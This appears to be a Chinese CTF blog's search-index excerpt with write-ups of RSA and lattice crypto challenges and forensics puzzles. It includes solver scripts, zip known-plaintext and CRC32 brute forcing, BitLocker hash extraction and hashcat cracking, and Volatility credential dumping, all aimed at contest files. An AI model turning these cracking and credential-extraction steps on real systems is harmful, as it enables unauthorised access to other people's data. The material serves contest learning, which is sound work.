isPrime\rfrom os import urandom\rfrom random import getrandbits\rdef gen_rsa_primes(G):\rurand = bytes_to_long(urandom(521//8))\rwhile True:\rs = getrandbits(521) ^ urand\rQ = s*G\rif isPrime(Q.x) and isPrime(Q.y):\rprint(\"ECC Private key:\", hex(s))\rprint(\"RSA primes:\", hex(Q.x), hex(Q.y))\rprint(\"Modulo:\", hex(Q.x * Q.y))\rreturn (Q.x, Q.y)\rflag = int.from_bytes(input(), byteorder=\"big\")\recc_p = Curve.p\ra = Curve.a\rb = Curve.b\rGx = Curve.gx\rGy = Curve.gy\rG = Point(Gx, Gy, curve=Curve)\re = 0x10001\rp, q = gen_rsa_primes(G)\rn = p*q\rfile_out = open(\"downloads/ecc-rsa.txt\", \"w\")\rfile_out.write(\"ECC Curve Prime: \" + hex(ecc_p) + \"\\n\")\rfile_out.write(\"Curve a: \" + hex(a) + \"\\n\")\rfile_out.write(\"Curve b: \" + hex(b) + \"\\n\")\rfile_out.write(\"Gx: \" + hex(Gx) + \"\\n\")\rfile_out.write(\"Gy: \" + hex(Gy) + \"\\n\")\rfile_out.write(\"e: \" + hex(e) + \"\\n\")\rfile_out.write(\"p * q: \" + hex(n) + \"\\n\")\rc = pow(flag, e, n)\rfile_out.write(\"ciphertext: \" + hex(c) + \"\\n\")\rECC 和 RSA 的混合加密，需要求解p、q的值，点（p，q）根据椭圆曲线方程的一般形式：y^2 = x^3 + a*x + b，转换为q^2=p^3+a*p+b(mod ecc_p)，因为n = p * q，代入可得 p^2*q^2= p^2* p^3+ p^2* a*p+ p^2* b (mod ecc_p) ,n^2=p^5+a*p^3+b*p^2 (mod ecc_p) 。a、b、n、ecc_p都是已知的，求解过程如下： ecc_p = ECC Curve Prime\ra = Curve a\rb = Curve b\rn = p * q\rR.\u003cx\u003e=Zmod(ecc_p)[]\rf = x^5 + a*x^3 + b*x^2 - n^2\rf.roots()\r得到结果，设置为poss_p [(6813140671672694477701511883397067876211159809088064490593325584756562268820329988116480298456252746748095410666300132267213094431909630229631434972416225885, 1), (4573744216059593260686660411936793507327994800883645562370166075007970317346237399760397301505506131100113886281839847419425482918932436139080837246914736557, 1), (1859314969084523636298100850823722544590555574470838518640063093117116629078281861281849586432508721074855657736668366212762253040197962779753163192386773060, 1)] for p in poss_p: q = n//p phi = (p-1)*(q-1) d = invert(e,phi) m = pow(c,d,n) print(binascii.unhexlify(hex(m)[2:])) ","date":"2021-11-23","objectID":"/2021-11-23-rsa%E7%BB%83%E4%B9%A0%E6%96%B0/:6:0","tags":["CTF","密码学"],"title":"RSA练习▪新","uri":"/2021-11-23-rsa%E7%BB%83%E4%B9%A0%E6%96%B0/"},{"categories":["WriteUp"],"content":"0x07 [GKCTF 2021]RRRRsa from Crypto.Util.number import *\rfrom gmpy2 import gcd\rflag = b'xxxxxxxxxxxxx'\rp = getPrime(512)\rq = getPrime(512)\rm = bytes_to_long(flag)\rn = p*q\re = 65537\rc = pow(m,e,n)\rprint('c={}'.format(c))\rp1 = getPrime(512)\rq1 = getPrime(512)\rn1 = p1*q1\re1 = 65537\rassert gcd(e1,(p1-1)*(q1-1)) == 1\rc1 = pow(p,e1,n1)\rprint('n1={}'.format(n1))\rprint('c1={}'.format(c1))\rhint1 = pow(2020 * p1 + q1, 202020, n1)\rhint2 = pow(2021 * p1 + 212121, q1, n1)\rprint('hint1={}'.format(hint1))\rprint('hint2={}'.format(hint2))\rp2 = getPrime(512)\rq2 = getPrime(512)\rn2 = p2*q2\re2 = 65537\rassert gcd(e1,(p2-1)*(q2-1)) == 1\rc2 = pow(q,e2,n2)\rhint3 = pow(2020 * p2 + 2021 * q2, 202020, n2)\rhint4 = pow(2021 * p2 + 2020 * q2, 212121, n2)\rprint('n2={}'.format(n2))\rprint('c2={}'.format(c2))\rprint('hint3={}'.format(hint3))\rprint('hint4={}'.format(hint4))\r首先，把hint1经过二项式定理处理下，hint1=(2020p1202020+q1202020)%n1= 2020p1202020+k1*q1 hint2利用费马小定理处理，hint2%q1=2021p1+212121= 2021p1+212121+k2*q1。 设2020为a，2021为b，202020为x，212121为y hint1bx=(ap1x+k1*q1)*bx-–-–①，(hint2-y)xax=(bp1x+k*q1)*ax-—-② q1=gcd( ② - ① ,n1) hint3=(ap2x+bq2x)%n2 hint4=(bp2y+aq2y)%n2 hint3y=[(ap2)xy+(bq2)xy]%n2 hint4x= [(bp2)xy+(aq2)xy]%n2 bx*yhint3y%n2-–-–③，axy*hint4x%n2-–-–④ q2=gcd( ③ - ④ ,n2) a = 2020\rb = 2021\rx = 202020\ry = 212121\rres1 = pow(hint2-y,x,n1) * pow(a,x,n1) - hint1*pow(b,x,n1)\rq1 = gcd(res1,n1)\rp1 = n1//q1\rres2 = pow(b,x*y,n2) * pow(hint3,y,n2) - pow(a,x*y,n2) * pow(hint4,x,n2) q2 = gcd(res2,n2)\rp2 = n2//q2\rphi1 = (q1-1)*(p1-1)\rphi2 = (q2-1)*(p2-1)\rd2 = gmpy2.invert(e,phi2)\rq = pow(c2,d2,n2)\rd1 = gmpy2.invert(e,phi1)\rp = pow(c1,d1,n1)\rphi = (q-1)*(p-1)\rd = gmpy2.invert(e,phi)\rm = pow(c,d,p*q)\rprint(long_to_bytes(m))\r","date":"2021-11-23","objectID":"/2021-11-23-rsa%E7%BB%83%E4%B9%A0%E6%96%B0/:7:0","tags":["CTF","密码学"],"title":"RSA练习▪新","uri":"/2021-11-23-rsa%E7%BB%83%E4%B9%A0%E6%96%B0/"},{"categories":["WriteUp"],"content":"0x08 [INSHack2019]Yet Another RSA Challenge - Part 1 import subprocess\rp = subprocess.check_output('openssl prime -generate -bits 2048 -hex')\rq = subprocess.check_output('openssl prime -generate -bits 2048 -hex')\rflag = int('INSA{REDACTED}'.encode('hex'), 16)\rN = int(p,16) * int(q,16)\rprint N\rprint '0x'+p.replace('9F','FC')\rprint pow(flag,65537,N)\rp的字符串被替换了，其中FC可能是原本就是FC也可能是9F替换的，我们发现共有4个FC 简单爆破下即可求出p，从而解出flag ","date":"2021-11-23","objectID":"/2021-11-23-rsa%E7%BB%83%E4%B9%A0%E6%96%B0/:8:0","tags":["CTF","密码学"],"title":"RSA练习▪新","uri":"/2021-11-23-rsa%E7%BB%83%E4%B9%A0%E6%96%B0/"},{"categories":["WriteUp"],"content":"0x09 [INSHack2019]Yet Another RSA Chall -Part 2 import subprocess p = subprocess.check_output('openssl prime -generate -bits 2048 -hex') q = subprocess.check_output('openssl prime -generate -bits 2048 -hex') flag = int('INSA{REDACTED}'.encode('hex'), 16) N = int(p,16) * int(q,16) print N print '0x'+p.replace('12','8D').replace('33','D4').replace('5E','FF').replace('09','95').replace('E4','38').replace('6B','89').replace('9E','E0').replace('59','3E') print pow(flag,65537,N) 属于上一题的升级版，替换的字符多了很多，脚本来源：https://ctftime.org/writeup/15206 ","date":"2021-11-23","objectID":"/2021-11-23-rsa%E7%BB%83%E4%B9%A0%E6%96%B0/:9:0","tags":["CTF","密码学"],"title":"RSA练习▪新","uri":"/2021-11-23-rsa%E7%BB%83%E4%B9%A0%E6%96%B0/"},{"categories":["WriteUp"],"content":"0x0A [NCTF2019]easyRSA from flag import flag e = 0x1337 p = 199138677823743837339927520157607820029746574557746549094921488292877226509198315016018919385259781238148402833316033634968163276198999279327827901879426429664674358844084491830543271625147280950273934405879341438429171453002453838897458102128836690385604150324972907981960626767679153125735677417397078196059 q = 112213695905472142415221444515326532320352429478341683352811183503269676555434601229013679319423878238944956830244386653674413411658696751173844443394608246716053086226910581400528167848306119179879115809778793093611381764939789057524575349501163689452810148280625226541609383166347879832134495444706697124741 n = p * q assert(flag.startswith('NCTF')) m = int.from_bytes(flag.encode(), 'big') assert(m.bit_length() \u003e 1337) c = pow(m, e, n) print(c) # 10562302690541901187975815594605242014385201583329309191736952454310803387032252007244962585846519762051885640856082157060593829013572592812958261432327975138581784360302599265408134332094134880789013207382277849503344042487389850373487656200657856862096900860792273206447552132458430989534820256156021128891296387414689693952047302604774923411425863612316726417214819110981605912408620996068520823370069362751149060142640529571400977787330956486849449005402750224992048562898004309319577192693315658275912449198365737965570035264841782399978307388920681068646219895287752359564029778568376881425070363592696751183359 gcd(e,phi)=e，按常规方法根本无法求出私钥d，官方writeup:http://yulige.top/?p=752#easyRSA909pt_2solvers。 sage代码源自：https://blog.csdn.net/weixin_52446095/article/details/119518573?utm_medium=distribute.pc_aggpage_search_result.none-task-blog-2~aggregatepage~first_rank_ecpm_v1~rank_v31_ecpm-6-119518573.pc_agg_new_rank\u0026utm_term=%5BNCTF2019%5DeasyRSA\u0026spm=1000.2123.3001.4430 import random import time def cal_k(s, r): R.\u003cx\u003e = PolynomialRing(GF(r)) f = x * s + 1 k = int(f.roots()[0][0]) print(k) return k # About 3 seconds to run def AMM(o, r, q): start = time.time() print('\\n----------------------------------------------------------------------------------') print('Start to run Adleman-Manders-Miller Root Extraction Method') print('Try to find one {:#x}th root of {} modulo {}'.format(r, o, q)) g = GF(q) o = g(o) p = g(random.randint(1, q)) while p ^ ((q-1) // r) == 1: p = g(random.randint(1, q)) print('[+] Find p:{}'.format(p)) t = 0 s = q - 1 while s % r == 0: t += 1 s = s // r print('[+] Find s:{}, t:{}'.format(s, t)) k = cal_k(s, r) alp = (k * s + 1) // r print('[+] Find alp:{}'.format(alp)) a = p ^ (r**(t-1) * s) b = o ^ (r*alp - 1) c = p ^ s h = 1 for i in range(1, t): d = b ^ (r^(t-1-i)) if d == 1: j = 0 else: print('[+] Calculating DLP...') j = - dicreat_log(a, d) print('[+] Finish DLP...') b = b * (c^r)^j h = h * c^j c = c ^ r result = o^alp * h end = time.time() print(\"Finished in {} seconds.\".format(end - start)) print('Find one solution: {}'.format(result)) return result def findAllPRoot(p, e): print(\"Start to find all the Primitive {:#x}th root of 1 modulo {}.\".format(e, p)) start = time.time() proot = set() while len(proot) \u003c e: proot.add(pow(random.randint(2, p-1), (p-1)//e, p)) end = time.time() print(\"Finished in {} seconds.\".format(end - start)) return proot def findAllSolutions(mp, proot, cp, p): print(\"Start to find all the {:#x}th root of {} modulo {}.\".format(e, cp, p)) start = time.time() all_mp = set() for root in proot: mp2 = mp * root % p assert(pow(mp2, e, p) == cp) all_mp.add(mp2) end = time.time() print(\"Finished in {} seconds.\".format(end - start)) return all_mp c = 10562302690541901187975815594605242014385201583329309191736952454310803387032252007244962585846519762051885640856082157060593829013572592812958261432327975138581784360302599265408134332094134880789013207382277849503344042487389850373487656200657856862096900860792273206447552132458430989534820256156021128891296387414689693952047302604774923411425863612316726417214819110981605912408620996068520823370069362751149060142640529571400977787330956486849449","date":"2021-11-23","objectID":"/2021-11-23-rsa%E7%BB%83%E4%B9%A0%E6%96%B0/:10:0","tags":["CTF","密码学"],"title":"RSA练习▪新","uri":"/2021-11-23-rsa%E7%BB%83%E4%B9%A0%E6%96%B0/"},{"categories":["WriteUp"],"content":"0x00 深育杯-Login 在页面下载example.zip，用winrar查看 010editor尝试修改伪加密，得到示例副本 然后使用ARCHPR进行已知明文攻击，得到压缩包的密码为qwe@123 得到password.zip，查看发现里面的三个TXT文件非常小，猜测可以用crc32爆破。 python crc32.py reverse crc32密文\r组合在一起就是welc0me_sangforctf，解压得到.password.swp，kali下执行vim -r .password.swp恢复出原文件，得到： 账号：Admin\r密码：5f4dcc3b5aa765d61d8327deb882cf99\r登录页面，查看源代码即可获得flag。 ","date":"2021-11-21","objectID":"/2021-11-21-%E8%BF%91%E6%9C%9F%E4%B8%80%E4%BA%9Bctf%E6%AF%94%E8%B5%9B%E7%9A%84%E9%A2%98%E7%9B%AEmisccrypto/:1:0","tags":["CTF"],"title":"近期一些CTF比赛的题目（MISC+CRYPTO）","uri":"/2021-11-21-%E8%BF%91%E6%9C%9F%E4%B8%80%E4%BA%9Bctf%E6%AF%94%E8%B5%9B%E7%9A%84%E9%A2%98%E7%9B%AEmisccrypto/"},{"categories":["WriteUp"],"content":"0x01 深育杯-GeGe from Crypto.Util.number import *\rimport gmpy2\rfrom flag import flag\rdef encrypt(plaintext):\rp = getStrongPrime(3072) m = bytes_to_long(plaintext)\rr = getRandomNBitInteger(1024)\rwhile True:\rf = getRandomNBitInteger(1024)\rg = getStrongPrime(768)\rh = gmpy2.invert(f, p) * g % p\rc = (r * h + m * f) % p\rreturn (h, p, c)\rh, p, c = encrypt(flag)\rwith open(\"cipher.txt\", \"w\") as f:\rf.write(\"h = \" + str(h) + \"\\n\")\rf.write(\"p = \" + str(p) + \"\\n\")\rf.write(\"c = \" + str(c) + \"\\n\")\r参考https://xz.aliyun.com/t/7163、https://mp.weixin.qq.com/s/1V5BEsfdZNRKwWP1mCs8wQ整理如下： 现在只要求f、g，就能解出m，看做格来求解SVP问题。 可以构造一个由下面这个矩阵M中的两个行向量(1,h), (0,p)所张成的格 在https://cocalc.com上在线运行sage代码 # Construct lattice.\rv1 = vector(ZZ, [1, h])\rv2 = vector(ZZ, [0, p])\rm = matrix([v1,v2]);\r# Solve SVP.\rshortest_vector = m.LLL()[0]\rf, g = shortest_vector\rif f \u003c 0:\rf = -f\rif g \u003c 0:\rg = -g\r# Decrypt.\ra = f * c % p % g\rm = a * inverse_mod(f, g) * inverse_mod(f, g) % g\rprint(hex(m))\r解得：0x666c61677b70666132733166363561647334667765763173326433763163787861767165737d，转十六进制，得到 SangFor{pfa2s1f65ads4fwev1s2d3v1cxxavqes}\r","date":"2021-11-21","objectID":"/2021-11-21-%E8%BF%91%E6%9C%9F%E4%B8%80%E4%BA%9Bctf%E6%AF%94%E8%B5%9B%E7%9A%84%E9%A2%98%E7%9B%AEmisccrypto/:2:0","tags":["CTF"],"title":"近期一些CTF比赛的题目（MISC+CRYPTO）","uri":"/2021-11-21-%E8%BF%91%E6%9C%9F%E4%B8%80%E4%BA%9Bctf%E6%AF%94%E8%B5%9B%E7%9A%84%E9%A2%98%E7%9B%AEmisccrypto/"},{"categories":["WriteUp"],"content":"0x02 深育杯-Disk 解压文件得到文件名zse456tfdyhnjimko0-=[;.,.vera，官方的hint，文件名初级磁盘密码。 根据文件名在键盘上画出图形，得到密码。 使用VeraCrypt挂载后得到两个文件 用010editor打开good，发现文件头是7z。 解压得到附件gooood，分析发现为windows下的分区。 重命名为vhd文件，用DiskGenius打开发现存在BitLocker加密。 使用bitlocker2john -i gooood.vhd，将User Password hash的第一个值或第二个值保存成hash.txt $bitlocker$0$16$6c1fbe8314e64b4042110147cb1632d2$1048576$12$a0348897f591d70103000000$60$fb026c1039aec7a85c77964d9cf2b63f6261579f431dfdb675322ab91e44acab870c75a64b5722be3500b35bcee969dc59e31ffdf88c1cb3a07776fa $bitlocker$1$16$6c1fbe8314e64b4042110147cb1632d2$1048576$12$a0348897f591d70103000000$60$fb026c1039aec7a85c77964d9cf2b63f6261579f431dfdb675322ab91e44acab870c75a64b5722be3500b35bcee969dc59e31ffdf88c1cb3a07776fa 使用hashcat -m 22100 hash.txt rockyou.txt --show，指定哈希类型后爆破。 得到密码是abcd1234，解锁打开回收站，发现hint和一个7z文件。 rdp协议默认开启位图缓存功能，会产生bmc文件，使用bmc-tool或者BMC Viewer能够恢复出缓存的图像。 7c解压后用BMC Viewer查看，得到cmRwY2FjaGUtYm1j，解密base64得到flag 或者使用bmc-tools.py -s bcache24 -d 1 找到 flag 缩略图 ","date":"2021-11-21","objectID":"/2021-11-21-%E8%BF%91%E6%9C%9F%E4%B8%80%E4%BA%9Bctf%E6%AF%94%E8%B5%9B%E7%9A%84%E9%A2%98%E7%9B%AEmisccrypto/:3:0","tags":["CTF"],"title":"近期一些CTF比赛的题目（MISC+CRYPTO）","uri":"/2021-11-21-%E8%BF%91%E6%9C%9F%E4%B8%80%E4%BA%9Bctf%E6%AF%94%E8%B5%9B%E7%9A%84%E9%A2%98%E7%9B%AEmisccrypto/"},{"categories":["WriteUp"],"content":"0x03 深育杯-Brige 用Stegsolve发现存在LSB隐写，导出PNG文件 010editor删除文件头多余的部分后得到图片 分析其像素 from PIL import Image\rimg = Image.open('1.png')\rheight = img.size[0]\rwidth = img.size[1]\rpixeltxt = open('pixel.txt','a')\rfor x in range(height):\rfor y in range(width):\rpixel = img.getpixel((x,y))\rpixeltxt.write(str(pixel) + '\\n')\r发现像素的第三部分存在问题，。 将前四个数据，处理后得到zip文件的文件头 提取生成数据，用010editor生成压缩包文件 from PIL import Image\rimg = Image.open('1.png')\rheight = img.size[0]\rwidth = img.size[1]\rpixeltxt = open('pixel.txt','a')\rzipstrings = ''\rfor x in range(height):\rfor y in range(width):\rpixel = img.getpixel((x,y))[2]\rhexnum = hex(pixel)\rzipstrings +=str(hexnum)[2:].zfill(2)\rzip = open('flag.txt','a')\rzip.write(zipstrings)\r分析brige.png发现存在异常的chunk，结合pngcheck发现IDAT数据块存在问题 010editor中看到最后一个IDAT数据块长度异常，将IDAT标识后面的87 9C两个字节，恢复成zlib数据头标识78 9C，导出这段zlib数据。 导出zlib数据为flag文件，用python脚本解出 import zlib\rfile = open('flag','rb').read()\rdata = zlib.decompress(file)\rrar = open('1.rar','wb')\rrar.write(data)\r使用exiftool分析原图，发现异常数据。 转16进制得到dynamical-geometry，解压之前获得的压缩包，看到stl文件，打开获得一半flag 把flag2同样修改成stl文件预览，得到整个flag。 ","date":"2021-11-21","objectID":"/2021-11-21-%E8%BF%91%E6%9C%9F%E4%B8%80%E4%BA%9Bctf%E6%AF%94%E8%B5%9B%E7%9A%84%E9%A2%98%E7%9B%AEmisccrypto/:4:0","tags":["CTF"],"title":"近期一些CTF比赛的题目（MISC+CRYPTO）","uri":"/2021-11-21-%E8%BF%91%E6%9C%9F%E4%B8%80%E4%BA%9Bctf%E6%AF%94%E8%B5%9B%E7%9A%84%E9%A2%98%E7%9B%AEmisccrypto/"},{"categories":["WriteUp"],"content":"0x04 湖湘杯-signin from Crypto.Util.number import *\rfrom secret import flag\rimport random\rm1 = bytes_to_long(flag[:len(flag) // 2])\rm2 = bytes_to_long(flag[len(flag) // 2:])\rdef gen(pbits, qbits):\rp1, q1 = getPrime(pbits), getPrime(qbits)\rn1 = p1**4*q1\rq2 = getPrime(qbits)\rbound = p1 // (8*q1*q2) + 1\rp2 = random.randrange(p1, p1 + bound)\rwhile not isPrime(p2):\rp2 = random.randrange(p1, p1 + bound)\rn2 = p2**4*q2\rreturn (n1, n2), (p1, q1), (p2, q2)\re = 0x10001\rpbits = int(360)\rqbits = int(128)\rpk, sk1, sk2 = gen(pbits, qbits)\rc1 = pow(m1, e, pk[0])\rc2 = pow(m2, e, pk[1])\rprint(f'pk = {pk}')\rprint(f'c1, c2 = {c1, c2}')\r给出了n1、n2、c1、c2、e，和[羊城杯 2020]RRRRRRRSA类似，用维纳攻击解，先得出 from Crypto.Util.number import *\rimport gmpy2\rdef continuedFra(x, y): #不断生成连分数的项\rcF = []\rwhile y:\rcF += [x // y]\rx, y = y, x % y\rreturn cF\rdef Simplify(ctnf): #化简\rnumerator = 0\rdenominator = 1\rfor x in ctnf[::-1]: #注意这里是倒叙遍历\rnumerator, denominator = denominator, x * denominator + numerator\rreturn (numerator, denominator) #把连分数分成分子和算出来的分母\rdef getit(c):\rcf=[]\rfor i in range(1,len(c)):\rcf.append(Simplify(c[:i])) #各个阶段的连分数的分子和分母\rreturn cf #得到一串连分数\rdef wienerAttack(e, n):\rcf=continuedFra(e,n)\rfor (Q2,Q1) in getit(cf):#遍历得到的连分数，令分子分母分别是Q2，Q1\rif Q1 == 0:\rcontinue\rif N1%Q1==0 and Q1!=1:#满足这个条件就找到了\rreturn Q1,Q2\rprint('not find!')\rQ1,Q2 = wienerAttack(N1,N2)\rP1 = gmpy2.iroot(N1//Q1,4)[0]\rP2 = gmpy2.iroot(N2//Q2,4)[0]\rphi1 = P1 * P1 * P1 * (P1-1) * (Q1-1)\rphi2 = P2 * P2 * P2 * (P2-1) * (Q2-1)\rd1 = gmpy2.invert(e,phi1)\rd2 = gmpy2.invert(e,phi2)\rm1 = long_to_bytes(gmpy2.powmod(c1,d1,N1))\rm2 = long_to_bytes(gmpy2.powmod(c2,d2,N2))\rprint((m1 + m2))\r","date":"2021-11-21","objectID":"/2021-11-21-%E8%BF%91%E6%9C%9F%E4%B8%80%E4%BA%9Bctf%E6%AF%94%E8%B5%9B%E7%9A%84%E9%A2%98%E7%9B%AEmisccrypto/:5:0","tags":["CTF"],"title":"近期一些CTF比赛的题目（MISC+CRYPTO）","uri":"/2021-11-21-%E8%BF%91%E6%9C%9F%E4%B8%80%E4%BA%9Bctf%E6%AF%94%E8%B5%9B%E7%9A%84%E9%A2%98%E7%9B%AEmisccrypto/"},{"categories":["WriteUp"],"content":"0x05 西湖论剑-YUSA的小秘密 stegsolver发现red plane 0和green plane 0都有数据 from cv2 import cv2 as cv\rimg = cv.imread('yusa.png')\rsrc = cv.cvtColor(img, cv.COLOR_BGR2YCrCb)\rY, Cr, Cb = cv.split(src)\rcv.imwrite('Y.png', (Y % 2) * 255)\rcv.imwrite('Cr.png', (Cr % 2) * 255)\rcv.imwrite('Cb.png', (Cb % 2) * 255)\r","date":"2021-11-21","objectID":"/2021-11-21-%E8%BF%91%E6%9C%9F%E4%B8%80%E4%BA%9Bctf%E6%AF%94%E8%B5%9B%E7%9A%84%E9%A2%98%E7%9B%AEmisccrypto/:6:0","tags":["CTF"],"title":"近期一些CTF比赛的题目（MISC+CRYPTO）","uri":"/2021-11-21-%E8%BF%91%E6%9C%9F%E4%B8%80%E4%BA%9Bctf%E6%AF%94%E8%B5%9B%E7%9A%84%E9%A2%98%E7%9B%AEmisccrypto/"},{"categories":["WriteUp"],"content":"0x06 西湖论剑-Yusa的秘密 volatility -f Yusa-PC.raw --profile=Win7SP1x64 hashdump,发现yusa用户，使用PTF爆破密码YusaYusa520，打开压缩包Who_am_I 题目中提到Sakura组织，这里对文件进行搜索 分别导出文件 Sakura-didi导出后是一个加密的压缩包 公告内容是全体成员注意，我们将在11月20号，对地球发起总攻，请做好准备。 备忘录的内容是2021.11.15：请组织内的人务必删除所有不必要的联系方式，防止我们的计划出现问题。 根据备忘录获取的信息，找一下联系方式有关的文件 导出Mystery Man.contact，发现一串可疑的字符串 LF2XGYPPXSGOPO4E465YPZMITLSYRGXGWS7OJOEL42O2LZFYQDSLRKXEXO56LCVB566IZ2FPW7S37K7HQK46LLUM42EJB354RTSL3IHFR6VONHEJ4S4ITZNEVHTJPNXJS62OHAECGZGCWWRVOBUXMNKMGJTTKTDZME2TKU3PGVMWS5ZVGVYUKYJSKY2TON3ZJU2VSK3WGVGHK3BVGVJW6NLBGZCDK33NKQ2WE6KBGU3XKRJVG52UQNJXOVNDKTBSM42TK4KFGVRGK3BVLFLTGNBUINBTKYTFNQ2VSVZTGVNEOOJVLJBU4NKMGZSDKNCXNY2UY4KHGVGHSZZVG52WMNSLMVCTKWLJLI2DIQ2DMEZFMNJXG54WCT2EJF3VSV2NGVGW2SJVLJVFKNCNKRIXSWLNJJUVS6SJGNMTERLZJ5KFM3KNK5HG2TSEM46Q==== 解Base32得到 再解Base64得到一个key值820ac92b9f58142bbbc27ca295f1cf48 解密压缩包得到key.bmp 在Yusa.contact中发现hint 使用pstree查找下便笺相关的进程 volatility -f Yusa-PC.raw --profile=Win7SP1x64 memdump -p 2228 -D ./导出进程，再使用foremost -T 2228.dmp进行分离 得到带密码的压缩包 在00003824.ole发现rtf文件 删除掉多余的字符，构造rtf文件 {\\rtf1\\ansi\\ansicpg936\\deff0\\deflang1033\\deflangfe2052{\\fonttbl{0\\f0\\fnil\\fcharset134 \\'ce\\'a2\\'c8\\'ed\\'d1\\'c5\\'ba\\'da;}}{\\*\\generator Msftedit 5.41.21.2510;}\\viewkind4\\uc1\\pard\\tx336\\tx672\\tx1008\\tx1344\\tx1680\\tx2016\\tx2352\\tx2688\\tx3024\\tx3360\\tx3696\\tx4032\\tx4368\\tx4704\\tx5040\\tx5376\\tx5712\\tx6048\\tx6384\\tx6720\\tx7056\\tx7392\\tx7728\\tx8064\\tx8400\\tx8736\\tx9072\\tx9408\\tx9744\\tx10080\\tx10416\\tx10752\\highlight0\\lang2052\\f0\\fs22\\'d6\\'d5\\'d3\\'da\\'c4\\'c3\\'b5\\'bd\\'c1\\'cb\\'d7\\'e9\\'d6\\'af\\'b5\\'c4\\'ba\\'cb\\'d0\\'c4\\'c3\\'dc\\'c2\\'eb\\'a3\\'ac\\'ce\\'d2\\'b2\\'bb\\'cf\\'eb\\'d4\\'d9\\'b5\\'b1\\'ce\\'d4\\'b5\\'d7\\'c1\\'cb\\'a3\\'ac\\'ce\\'d2\\'cf\\'eb\\'b8\\'cf\\'bd\\'f4\\'c0\\'eb\\'bf\\'aa\\'d5\\'e2\\'b8\\'f6\\'b9\\'ed\\'b5\\'d8\\'b7\\'bd\\'a1\\'a3\\'ba\\'cb\\'d0\\'c4\\'c3\\'dc\\'c2\\'eb\\'ca\\'c7\\'a3\\'ba\\'ca\\'c0\\'bd\\'e7\\'c3\\'bb\\'c1\\'cb\\'d0\\'c4\\'cc\\'f8\\'a1\\'a3\\par } 打开得到世界没了心跳 解压压缩包，得到exp，内容如下： from PIL import Image\rimport struct\rpic = Image.open('key.bmp')\rfp = open('flag', 'rb')\rfs = open('Who_am_I', 'wb')\ra, b = pic.size\rlist1 = []\rfor y in range(b):\rfor x in range(a):\rpixel = pic.getpixel((x, y))\rlist1.extend([pixel[1], pixel[0], pixel[2], pixel[2], pixel[1], pixel[0]])\rdata = fp.read()\rfor i in range(0, len(data)):\rfs.write(struct.pack('B', data[i] ^ list1[i % a*b*6]))\rfp.close()\rfs.close()\r这是加密的过程，解密脚本如下： from PIL import Image\rimport struct\rpic = Image.open('key.bmp')\rfp = open('flag', 'wb')\rfs = open('Who_am_I', 'rb')\ra, b = pic.size\rlist1 = []\rfor y in range(b):\rfor x in range(a):\rpixel = pic.getpixel((x, y))\rlist1.extend([pixel[1], pixel[0], pixel[2], pixel[2], pixel[1], pixel[0]])\rdata = fs.read()\rfor i in range(0, len(data)):\rfp.write(struct.pack('B', data[i] ^ list1[i % a*b*6]))\rfp.close()\rfs.close()\r得到flag，经过判断为gif文件 我们用010editor打开，发现高度不对，6、7字节为宽， 8、9字节为高，且为小端序储存方式 ，修改为8、9字节为1D 10 打开可以看到flag ","date":"2021-11-21","objectID":"/2021-11-21-%E8%BF%91%E6%9C%9F%E4%B8%80%E4%BA%9Bctf%E6%AF%94%E8%B5%9B%E7%9A%84%E9%A2%98%E7%9B%AEmisccrypto/:7:0","tags":["CTF"],"title":"近期一些CTF比赛的题目（MISC+CRYPTO）","uri":"/2021-11-21-%E8%BF%91%E6%9C%9F%E4%B8%80%E4%BA%9Bctf%E6%AF%94%E8%B5%9B%E7%9A%84%E9%A2%98%E7%9B%AEmisccrypto/"},{"categories":["WriteUp"],"content":"0x07 西湖论剑-hardrsa [羊城杯 2020]Power魔改 from Crypto.Util.number import * import sympy e = 0x10001 dp = 379476973158146550831004952747643994439940435656483772269013081580532539640189020020958796514224150837680366977747272291881285391919167077726836326564473 c = 57248258945927387673579467348106118747034381190703777861409527336272914559699490353325906672956273559867941402281438670652710909532261303394045079629146156340801932254839021574139943933451924062888426726353230757284582863993227592703323133265180414382062132580526658205716218046366247653881764658891315592607194355733209493239611216193118424602510964102026998674323685134796018596817393268106583737153516632969041693280725297929277751136040546830230533898514659714717213371619853137272515967067008805521051613107141555788516894223654851277785393355178114230929014037436770678131148140398384394716456450269539065009396311996040422853740049508500540281488171285233445744799680022307180452210793913614131646875949698079917313572873073033804639877699884489290120302696697425 c1 = 78100131461872285613426244322737502147219485108799130975202429638042859488136933783498210914335741940761656137516033926418975363734194661031678516857040723532055448695928820624094400481464950181126638456234669814982411270985650209245687765595483738876975572521276963149542659187680075917322308512163904423297381635532771690434016589132876171283596320435623376283425228536157726781524870348614983116408815088257609788517986810622505961538812889953185684256469540369809863103948326444090715161351198229163190130903661874631020304481842715086104243998808382859633753938512915886223513449238733721777977175430329717970940440862059204518224126792822912141479260791232312544748301412636222498841676742208390622353022668320809201312724936862167350709823581870722831329406359010293121019764160016316259432749291142448874259446854582307626758650151607770478334719317941727680935243820313144829826081955539778570565232935463201135110049861204432285060029237229518297291679114165265808862862827211193711159152992427133176177796045981572758903474465179346029811563765283254777813433339892058322013228964103304946743888213068397672540863260883314665492088793554775674610994639537263588276076992907735153702002001005383321442974097626786699895993544581572457476437853778794888945238622869401634353220344790419326516836146140706852577748364903349138246106379954647002557091131475669295997196484548199507335421499556985949139162639560622973283109342746186994609598854386966520638338999059 g = 2 y = 449703347709287328982446812318870158230369688625894307953604074502413258045265502496365998383562119915565080518077360839705004058211784369656486678307007348691991136610142919372779782779111507129101110674559235388392082113417306002050124215904803026894400155194275424834577942500150410440057660679460918645357376095613079720172148302097893734034788458122333816759162605888879531594217661921547293164281934920669935417080156833072528358511807757748554348615957977663784762124746554638152693469580761002437793837094101338408017407251986116589240523625340964025531357446706263871843489143068620501020284421781243879675292060268876353250854369189182926055204229002568224846436918153245720514450234433170717311083868591477186061896282790880850797471658321324127334704438430354844770131980049668516350774939625369909869906362174015628078258039638111064842324979997867746404806457329528690722757322373158670827203350590809390932986616805533168714686834174965211242863201076482127152571774960580915318022303418111346406295217571564155573765371519749325922145875128395909112254242027512400564855444101325427710643212690768272048881411988830011985059218048684311349415764441760364762942692722834850287985399559042457470942580456516395188637916303814055777357738894264037988945951468416861647204658893837753361851667573185920779272635885127149348845064478121843462789367112698673780005436144393573832498203659056909233757206537514290993810628872250841862059672570704733990716282248839 